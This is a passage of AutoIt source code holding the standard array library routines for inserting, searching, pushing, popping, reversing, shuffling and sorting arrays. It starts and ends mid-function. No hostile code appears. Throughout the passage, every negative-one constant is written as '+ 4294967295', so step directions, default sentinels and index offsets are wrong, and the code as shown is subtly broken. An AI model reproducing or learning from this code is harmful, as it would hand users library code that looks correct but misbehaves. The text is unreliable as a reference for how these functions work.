	Case $ARRAYFILL_FORCE_STRING
		$HDATATYPE = String
	EndSwitch
	Local $ASPLIT_1 , $ASPLIT_2
	If IsArray ( $VRANGE ) Then
		If UBound ( $VRANGE , $UBOUND_DIMENSIONS ) <> 1 Or UBound ( $VRANGE , $UBOUND_ROWS ) < 2 Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		Local $INUMBER
		$VRANGE = StringStripWS ( $VRANGE , 8 )
		$ASPLIT_1 = StringSplit ( $VRANGE , ";" )
		$VRANGE = ""
		For $I = 1 To $ASPLIT_1 [ 0 ]
			If Not StringRegExp ( $ASPLIT_1 [ $I ] , "^\d+(-\d+)?$" ) Then Return SetError ( 3 , 0 , + 4294967295 )
			$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , "-" )
			Switch $ASPLIT_2 [ 0 ]
			Case 1
				$VRANGE &= $ASPLIT_2 [ 1 ] & ";"
			Case 2
				If Number ( $ASPLIT_2 [ 2 ] ) >= Number ( $ASPLIT_2 [ 1 ] ) Then
					$INUMBER = $ASPLIT_2 [ 1 ] + 4294967295
					Do
						$INUMBER += 1
						$VRANGE &= $INUMBER & ";"
					Until $INUMBER = $ASPLIT_2 [ 2 ]
				EndIf
			EndSwitch
		Next
		$VRANGE = StringSplit ( StringTrimRight ( $VRANGE , 1 ) , ";" )
	EndIf
	If $VRANGE [ 1 ] < 0 Or $VRANGE [ $VRANGE [ 0 ] ] > $IDIM_1 Then Return SetError ( 5 , 0 , + 4294967295 )
	For $I = 2 To $VRANGE [ 0 ]
		If $VRANGE [ $I ] < $VRANGE [ $I + 4294967295 ] Then Return SetError ( 3 , 0 , + 4294967295 )
	Next
	Local $ICOPYTO_INDEX = $IDIM_1 + $VRANGE [ 0 ]
	Local $IINSERTPOINT_INDEX = $VRANGE [ 0 ]
	Local $IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IFORCE = $ARRAYFILL_FORCE_SINGLEITEM Then
			ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ]
			For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
				$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROMINDEX ]
				$ICOPYTO_INDEX -= 1
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
				While $IREADFROMINDEX = $IINSERT_INDEX
					$AARRAY [ $ICOPYTO_INDEX ] = $VVALUE
					$ICOPYTO_INDEX -= 1
					$IINSERTPOINT_INDEX -= 1
					If $IINSERTPOINT_INDEX < 1 Then ExitLoop 2
					$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
				WEnd
			Next
			Return $IDIM_1 + $VRANGE [ 0 ] + 1
		EndIf
		ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ]
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 5 , 0 , + 4294967295 )
			$HDATATYPE = 0
		Else
			Local $ATMP = StringSplit ( $VVALUE , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			If UBound ( $ATMP , $UBOUND_ROWS ) = 1 Then
				$ATMP [ 0 ] = $VVALUE
				$HDATATYPE = 0
			EndIf
			$VVALUE = $ATMP
		EndIf
		For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
			$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROMINDEX ]
			$ICOPYTO_INDEX -= 1
			$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			While $IREADFROMINDEX = $IINSERT_INDEX
				If $IINSERTPOINT_INDEX <= UBound ( $VVALUE , $UBOUND_ROWS ) Then
					If IsFunc ( $HDATATYPE ) Then
						$AARRAY [ $ICOPYTO_INDEX ] = $HDATATYPE ( $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] )
					Else
						$AARRAY [ $ICOPYTO_INDEX ] = $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ]
					EndIf
				Else
					$AARRAY [ $ICOPYTO_INDEX ] = ""
				EndIf
				$ICOPYTO_INDEX -= 1
				$IINSERTPOINT_INDEX -= 1
				If $IINSERTPOINT_INDEX = 0 Then ExitLoop 2
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			WEnd
		Next
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ISTART < 0 Or $ISTART > $IDIM_2 + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
		Local $IVALDIM_1 , $IVALDIM_2
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 7 , 0 , + 4294967295 )
			$IVALDIM_1 = UBound ( $VVALUE , $UBOUND_ROWS )
			$IVALDIM_2 = UBound ( $VVALUE , $UBOUND_COLUMNS )
			$HDATATYPE = 0
		Else
			$ASPLIT_1 = StringSplit ( $VVALUE , $SDELIM_ROW , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			$IVALDIM_1 = UBound ( $ASPLIT_1 , $UBOUND_ROWS )
			StringReplace ( $ASPLIT_1 [ 0 ] , $SDELIM_ITEM , "" )
			$IVALDIM_2 = @extended + 1
			Local $ATMP [ $IVALDIM_1 ] [ $IVALDIM_2 ]
			For $I = 0 To $IVALDIM_1 + 4294967295
				$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
				For $J = 0 To $IVALDIM_2 + 4294967295
					$ATMP [ $I ] [ $J ] = $ASPLIT_2 [ $J ]
				Next
			Next
			$VVALUE = $ATMP
		EndIf
		If UBound ( $VVALUE , $UBOUND_COLUMNS ) + $ISTART > UBound ( $AARRAY , $UBOUND_COLUMNS ) Then Return SetError ( 8 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ] [ $IDIM_2 ]
		For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
			For $J = 0 To $IDIM_2 + 4294967295
				$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $AARRAY [ $IREADFROMINDEX ] [ $J ]
			Next
			$ICOPYTO_INDEX -= 1
			$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			While $IREADFROMINDEX = $IINSERT_INDEX
				For $J = 0 To $IDIM_2 + 4294967295
					If $J < $ISTART Then
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
					ElseIf $J - $ISTART > $IVALDIM_2 + 4294967295 Then
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
					Else
						If $IINSERTPOINT_INDEX + 4294967295 < $IVALDIM_1 Then
							If IsFunc ( $HDATATYPE ) Then
								$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $HDATATYPE ( $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] [ $J - $ISTART ] )
							Else
								$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] [ $J - $ISTART ]
							EndIf
						Else
							$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
						EndIf
					EndIf
				Next
				$ICOPYTO_INDEX -= 1
				$IINSERTPOINT_INDEX -= 1
				If $IINSERTPOINT_INDEX = 0 Then ExitLoop 2
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			WEnd
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS )
EndFunc
Func _ARRAYMAX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	Local $IRESULT = _ARRAYMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM )
	If @error Then Return SetError ( @error , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then
		Return $AARRAY [ $IRESULT ]
	Else
		Return $AARRAY [ $IRESULT ] [ $ISUBITEM ]
	EndIf
EndFunc
Func _ARRAYMAXINDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Local $IRET = __ARRAY_MINMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , __ARRAY_GREATERTHAN )
	Return SetError ( @error , 0 , $IRET )
EndFunc
Func _ARRAYMIN ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	Local $IRESULT = _ARRAYMININDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM )
	If @error Then Return SetError ( @error , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then
		Return $AARRAY [ $IRESULT ]
	Else
		Return $AARRAY [ $IRESULT ] [ $ISUBITEM ]
	EndIf
EndFunc
Func _ARRAYMININDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Local $IRET = __ARRAY_MINMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , __ARRAY_LESSTHAN )
	Return SetError ( @error , 0 , $IRET )
EndFunc
Func _ARRAYPERMUTE ( ByRef $AARRAY , $SDELIMITER = "" )
	If $SDELIMITER = Default Then $SDELIMITER = ""
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $ISIZE = UBound ( $AARRAY ) , $IFACTORIAL = 1 , $AIDX [ $ISIZE ] , $ARESULT [ 1 ] , $ICOUNT = 1
	If UBound ( $AARRAY ) Then
		For $I = 0 To $ISIZE + 4294967295
			$AIDX [ $I ] = $I
		Next
		For $I = $ISIZE To 1 Step + 4294967295
			$IFACTORIAL *= $I
		Next
		ReDim $ARESULT [ $IFACTORIAL + 1 ]
		$ARESULT [ 0 ] = $IFACTORIAL
		__ARRAY_EXETERINTERNAL ( $AARRAY , 0 , $ISIZE , $SDELIMITER , $AIDX , $ARESULT , $ICOUNT )
	Else
		$ARESULT [ 0 ] = 0
	EndIf
	Return $ARESULT
EndFunc
Func _ARRAYPOP ( ByRef $AARRAY )
	If ( Not IsArray ( $AARRAY ) ) Then Return SetError ( 1 , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , "" )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IUBOUND = + 4294967295 Then Return SetError ( 3 , 0 , "" )
	Local $SLASTVAL = $AARRAY [ $IUBOUND ]
	If $IUBOUND > + 4294967295 Then
		ReDim $AARRAY [ $IUBOUND ]
	EndIf
	Return $SLASTVAL
EndFunc
Func _ARRAYPUSH ( ByRef $AARRAY , $VVALUE , $IDIRECTION = 0 )
	If $IDIRECTION = Default Then $IDIRECTION = 0
	If ( Not IsArray ( $AARRAY ) ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If IsArray ( $VVALUE ) Then
		Local $IUBOUNDS = UBound ( $VVALUE )
		If ( $IUBOUNDS + 4294967295 ) > $IUBOUND Then Return SetError ( 2 , 0 , 0 )
		If $IDIRECTION Then
			For $I = $IUBOUND To $IUBOUNDS Step + 4294967295
				$AARRAY [ $I ] = $AARRAY [ $I - $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS + 4294967295
				$AARRAY [ $I ] = $VVALUE [ $I ]
			Next
		Else
			For $I = 0 To $IUBOUND - $IUBOUNDS
				$AARRAY [ $I ] = $AARRAY [ $I + $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS + 4294967295
				$AARRAY [ $I + $IUBOUND - $IUBOUNDS + 1 ] = $VVALUE [ $I ]
			Next
		EndIf
	Else
		If $IUBOUND > + 4294967295 Then
			If $IDIRECTION Then
				For $I = $IUBOUND To 1 Step + 4294967295
					$AARRAY [ $I ] = $AARRAY [ $I + 4294967295 ]
				Next
				$AARRAY [ 0 ] = $VVALUE
			Else
				For $I = 0 To $IUBOUND + 4294967295
					$AARRAY [ $I ] = $AARRAY [ $I + 1 ]
				Next
				$AARRAY [ $IUBOUND ] = $VVALUE
			EndIf
		EndIf
	EndIf
	Return 1
EndFunc
Func _ARRAYREVERSE ( ByRef $AARRAY , $ISTART = 0 , $IEND = 0 )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	If Not UBound ( $AARRAY ) Then Return SetError ( 4 , 0 , 0 )
	Local $VTMP , $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	For $I = $ISTART To Int ( ( $ISTART + $IEND + 4294967295 ) / 2 )
		$VTMP = $AARRAY [ $I ]
		$AARRAY [ $I ] = $AARRAY [ $IEND ]
		$AARRAY [ $IEND ] = $VTMP
		$IEND -= 1
	Next
	Return 1
EndFunc
Func _ARRAYSEARCH ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $IFORWARD = 1 , $ISUBITEM = + 4294967295 , $BROW = False )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOMPARE = Default Then $ICOMPARE = 0
	If $IFORWARD = Default Then $IFORWARD = 1
	If $ISUBITEM = Default Then $ISUBITEM = + 4294967295
	If $BROW = Default Then $BROW = False
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY ) + 4294967295
	If $IDIM_1 = + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
	Local $BCOMPTYPE = False
	If $ICOMPARE = 2 Then
		$ICOMPARE = 0
		$BCOMPTYPE = True
	EndIf
	If $BROW Then
		If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $IEND < 1 Or $IEND > $IDIM_2 Then $IEND = $IDIM_2
		If $ISTART < 0 Then $ISTART = 0
		If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		If $IEND < 1 Or $IEND > $IDIM_1 Then $IEND = $IDIM_1
		If $ISTART < 0 Then $ISTART = 0
		If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	EndIf
	Local $ISTEP = 1
	If Not $IFORWARD Then
		Local $ITMP = $ISTART
		$ISTART = $IEND
		$IEND = $ITMP
		$ISTEP = + 4294967295
	EndIf
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If Not $ICOMPARE Then
			If Not $ICASE Then
				For $I = $ISTART To $IEND Step $ISTEP
					If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AARRAY [ $I ] = $VVALUE Then Return $I
				Next
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AARRAY [ $I ] == $VVALUE Then Return $I
				Next
			EndIf
		Else
			For $I = $ISTART To $IEND Step $ISTEP
				If $ICOMPARE = 3 Then
					If StringRegExp ( $AARRAY [ $I ] , $VVALUE ) Then Return $I
				Else
					If StringInStr ( $AARRAY [ $I ] , $VVALUE , $ICASE ) > 0 Then Return $I
				EndIf
			Next
		EndIf
	Case 2
		Local $IDIM_SUB
		If $BROW Then
			$IDIM_SUB = $IDIM_1
			If $ISUBITEM > $IDIM_SUB Then $ISUBITEM = $IDIM_SUB
			If $ISUBITEM < 0 Then
				$ISUBITEM = 0
			Else
				$IDIM_SUB = $ISUBITEM
			EndIf
		Else
			$IDIM_SUB = $IDIM_2
			If $ISUBITEM > $IDIM_SUB Then $ISUBITEM = $IDIM_SUB
			If $ISUBITEM < 0 Then
				$ISUBITEM = 0
			Else
				$IDIM_SUB = $ISUBITEM
			EndIf
		EndIf
		For $J = $ISUBITEM To $IDIM_SUB
			If Not $ICOMPARE Then
				If Not $ICASE Then
					For $I = $ISTART To $IEND Step $ISTEP
						If $BROW Then
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $J ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $J ] [ $I ] = $VVALUE Then Return $I
						Else
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $I ] [ $J ] = $VVALUE Then Return $I
						EndIf
					Next
				Else
					For $I = $ISTART To $IEND Step $ISTEP
						If $BROW Then
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $J ] [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $J ] [ $I ] == $VVALUE Then Return $I
						Else
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $I ] [ $J ] == $VVALUE Then Return $I
						EndIf
					Next
				EndIf
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If $ICOMPARE = 3 Then
						If $BROW Then
							If StringRegExp ( $AARRAY [ $J ] [ $I ] , $VVALUE ) Then Return $I
						Else
							If StringRegExp ( $AARRAY [ $I ] [ $J ] , $VVALUE ) Then Return $I
						EndIf
					Else
						If $BROW Then
							If StringInStr ( $AARRAY [ $J ] [ $I ] , $VVALUE , $ICASE ) > 0 Then Return $I
						Else
							If StringInStr ( $AARRAY [ $I ] [ $J ] , $VVALUE , $ICASE ) > 0 Then Return $I
						EndIf
					EndIf
				Next
			EndIf
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return SetError ( 6 , 0 , + 4294967295 )
EndFunc
Func _ARRAYSHUFFLE ( ByRef $AARRAY , $ISTART_ROW = 0 , $IEND_ROW = 0 , $ICOL = + 4294967295 )
	If $ISTART_ROW = Default Then $ISTART_ROW = 0
	If $IEND_ROW = Default Then $IEND_ROW = 0
	If $ICOL = Default Then $ICOL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If $IEND_ROW = 0 Then $IEND_ROW = $IDIM_1 + 4294967295
	If $ISTART_ROW < 0 Or $ISTART_ROW > $IDIM_1 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $IEND_ROW < 1 Or $IEND_ROW > $IDIM_1 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $VTMP , $IRAND
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = $IEND_ROW To $ISTART_ROW + 1 Step + 4294967295
			$IRAND = Random ( $ISTART_ROW , $I , 1 )
			$VTMP = $AARRAY [ $I ]
			$AARRAY [ $I ] = $AARRAY [ $IRAND ]
			$AARRAY [ $IRAND ] = $VTMP
		Next
		Return 1
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ICOL < + 4294967295 Or $ICOL > $IDIM_2 + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		Local $ICOL_START , $ICOL_END
		If $ICOL = + 4294967295 Then
			$ICOL_START = 0
			$ICOL_END = $IDIM_2 + 4294967295
		Else
			$ICOL_START = $ICOL
			$ICOL_END = $ICOL
		EndIf
		For $I = $IEND_ROW To $ISTART_ROW + 1 Step + 4294967295
			$IRAND = Random ( $ISTART_ROW , $I , 1 )
			For $J = $ICOL_START To $ICOL_END
				$VTMP = $AARRAY [ $I ] [ $J ]
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $IRAND ] [ $J ]
				$AARRAY [ $IRAND ] [ $J ] = $VTMP
			Next
		Next
		Return 1
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
EndFunc
Func _ARRAYSORT ( ByRef $AARRAY , $IDESCENDING = 0 , $ISTART = 0 , $IEND = 0 , $ISUBITEM = 0 , $IPIVOT = 0 )
	If $IDESCENDING = Default Then $IDESCENDING = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If $IPIVOT = Default Then $IPIVOT = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IUBOUND = + 4294967295 Then Return SetError ( 5 , 0 , 0 )
	If $IEND = Default Then $IEND = 0
	If $IEND < 1 Or $IEND > $IUBOUND Or $IEND = Default Then $IEND = $IUBOUND
	If $ISTART < 0 Or $ISTART = Default Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	If $IDESCENDING = Default Then $IDESCENDING = 0
	If $IPIVOT = Default Then $IPIVOT = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IPIVOT Then
			__ARRAYDUALPIVOTSORT ( $AARRAY , $ISTART , $IEND )
		Else
			__ARRAYQUICKSORT1D ( $AARRAY , $ISTART , $IEND )
		EndIf
		If $IDESCENDING Then _ARRAYREVERSE ( $AARRAY , $ISTART , $IEND )
	Case 2
		If $IPIVOT Then Return SetError ( 6 , 0 , 0 )
		Local $ISUBMAX = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISUBITEM > $ISUBMAX Then Return SetError ( 3 , 0 , 0 )
		If $IDESCENDING Then
			$IDESCENDING = + 4294967295
		Else
			$IDESCENDING = 1
		EndIf
		__ARRAYQUICKSORT2D ( $AARRAY , $IDESCENDING , $ISTART , $IEND , $ISUBITEM , $ISUBMAX )
Case Else
		Return SetError ( 4 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func __ARRAYQUICKSORT1D ( ByRef $AARRAY , Const ByRef $ISTART , Const ByRef $IEND )
	If $IEND <= $ISTART Then Return
	Local $VTMP
	If ( $IEND - $ISTART ) < 15 Then
		Local $VCUR
		For $I = $ISTART + 1 To $IEND
			$VTMP = $AARRAY [ $I ]
			If IsNumber ( $VTMP ) Then
				For $J = $I + 4294967295 To $ISTART Step + 4294967295
					$VCUR = $AARRAY [ $J ]
					If ( $VTMP >= $VCUR And IsNumber ( $VCUR ) ) Or ( Not IsNumber ( $VCUR ) And StringCompare ( $VTMP , $VCUR ) >= 0 ) Then ExitLoop
					$AARRAY [ $J + 1 ] = $VCUR
				Next
			Else
				For $J = $I + 4294967295 To $ISTART Step + 4294967295
					If ( StringCompare ( $VTMP , $AARRAY [ $J ] ) >= 0 ) Then ExitLoop
					$AARRAY [ $J + 1 ] = $AARRAY [ $J ]
				Next
			EndIf
			$AARRAY [ $J + 1 ] = $VTMP
		Next
		Return
	EndIf
	Local $L = $ISTART , $R = $IEND , $VPIVOT = $AARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] , $BNUM = IsNumber ( $VPIVOT )
	Do
		If $BNUM Then
			While ( $AARRAY [ $L ] < $VPIVOT And IsNumber ( $AARRAY [ $L ] ) ) Or ( Not IsNumber ( $AARRAY [ $L ] ) And StringCompare ( $AARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $AARRAY [ $R ] > $VPIVOT And IsNumber ( $AARRAY [ $R ] ) ) Or ( Not IsNumber ( $AARRAY [ $R ] ) And StringCompare ( $AARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( StringCompare ( $AARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( StringCompare ( $AARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			$VTMP = $AARRAY [ $L ]
			$AARRAY [ $L ] = $AARRAY [ $R ]
			$AARRAY [ $R ] = $VTMP
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT1D ( $AARRAY , $ISTART , $R )
	__ARRAYQUICKSORT1D ( $AARRAY , $L , $IEND )
EndFunc
Func __ARRAYQUICKSORT2D ( ByRef $AARRAY , Const ByRef $ISTEP , Const ByRef $ISTART , Const ByRef $IEND , Const ByRef $ISUBITEM , Const ByRef $ISUBMAX )
	If $IEND <= $ISTART Then Return
	Local $VTMP , $L = $ISTART , $R = $IEND , $VPIVOT = $AARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] [ $ISUBITEM ] , $BNUM = IsNumber ( $VPIVOT )
	Do
		If $BNUM Then
			While ( $ISTEP * ( $AARRAY [ $L ] [ $ISUBITEM ] - $VPIVOT ) < 0 And IsNumber ( $AARRAY [ $L ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AARRAY [ $L ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * ( $AARRAY [ $R ] [ $ISUBITEM ] - $VPIVOT ) > 0 And IsNumber ( $AARRAY [ $R ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AARRAY [ $R ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( $ISTEP * StringCompare ( $AARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * StringCompare ( $AARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			For $I = 0 To $ISUBMAX
				$VTMP = $AARRAY [ $L ] [ $I ]
				$AARRAY [ $L ] [ $I ] = $AARRAY [ $R ] [ $I ]
				$AARRAY [ $R ] [ $I ] = $VTMP
			Next
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT2D ( $AARRAY , $ISTEP , $ISTART , $R , $ISUBITEM , $ISUBMAX )
	__ARRAYQUICKSORT2D ( $AARRAY , $ISTEP , $L , $IEND , $ISUBITEM , $ISUBMAX )
EndFunc
Func __ARRAYDUALPIVOTSORT ( ByRef $AARRAY , $IPIVOT_LEFT , $IPIVOT_RIGHT , $BLEFTMOST = True )
	If $IPIVOT_LEFT > $IPIVOT_RIGHT Then Return
	Local $ILENGTH = $IPIVOT_RIGHT - $IPIVOT_LEFT + 1
	Local $I , $J , $K , $IAI , $IAK , $IA1 , $IA2 , $ILAST
	If $ILENGTH < 45 Then
		If $BLEFTMOST Then
			$I = $IPIVOT_LEFT
			While $I < $IPIVOT_RIGHT
				$J = $I
				$IAI = $AARRAY [ $I + 1 ]
				While $IAI < $AARRAY [ $J ]
					$AARRAY [ $J + 1 ] = $AARRAY [ $J ]
					$J -= 1
					If $J + 1 = $IPIVOT_LEFT Then ExitLoop
				WEnd
				$AARRAY [ $J + 1 ] = $IAI
				$I += 1
			WEnd
		Else
			While 1
				If $IPIVOT_LEFT >= $IPIVOT_RIGHT Then Return 1
				$IPIVOT_LEFT += 1
				If $AARRAY [ $IPIVOT_LEFT ] < $AARRAY [ $IPIVOT_LEFT + 4294967295 ] Then ExitLoop
			WEnd
			While 1
				$K = $IPIVOT_LEFT
				$IPIVOT_LEFT += 1
				If $IPIVOT_LEFT > $IPIVOT_RIGHT Then ExitLoop
				$IA1 = $AARRAY [ $K ]
				$IA2 = $AARRAY [ $IPIVOT_LEFT ]
				If $IA1 < $IA2 Then
					$IA2 = $IA1
					$IA1 = $AARRAY [ $IPIVOT_LEFT ]
				EndIf
				$K -= 1
				While $IA1 < $AARRAY [ $K ]
					$AARRAY [ $K + 2 ] = $AARRAY [ $K ]
					$K -= 1
				WEnd
				$AARRAY [ $K + 2 ] = $IA1
				While $IA2 < $AARRAY [ $K ]
					$AARRAY [ $K + 1 ] = $AARRAY [ $K ]
					$K -= 1
				WEnd
